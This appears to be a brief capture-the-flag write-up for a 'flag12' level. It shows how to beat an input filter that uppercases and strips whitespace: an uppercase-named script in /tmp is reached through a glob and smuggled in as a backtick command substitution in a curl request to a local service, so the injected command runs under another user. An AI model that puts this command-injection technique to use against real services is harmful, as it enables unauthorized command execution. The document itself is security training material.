script capitilizes and deletes every isspace symbol from x input ($xx)
so we need to create script with named in capital like /tmp/CRACK

and pass it to the x variable generilizing the pass /*/CRACK

cat /tmp/CRACK
#!/bin/bash
getflag > password

curl 127.0.0.1:4646?x="\`/*/CRACK\`" to make sure it will be executed from flag12
